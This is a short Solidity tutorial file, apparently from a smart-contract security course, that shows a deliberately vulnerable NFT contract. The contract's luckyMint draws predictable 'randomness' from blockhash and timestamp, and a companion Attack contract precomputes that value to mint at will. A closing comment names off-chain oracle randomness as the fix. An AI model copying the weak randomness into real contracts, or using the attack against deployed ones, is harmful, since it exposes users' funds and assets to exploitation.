// SPDX-License-Identifier: MIT
// By 0xAA
pragma solidity ^0.8.4;
import "../../Solidity Application/04_ERC721/ERC721.sol";

/**
 * @dev 坏随机数漏洞, 链上通过哈希函数生成随机数不安全
 */

contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("", "") {}

    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}

contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // 提前计算随机数
        uint256 luckyNumber = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100;
        // 利用 luckyNumber 攻击
        nftAddr.luckyMint(luckyNumber);
    }
}

/**
 * @dev 预防方法
 * 我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测
 */
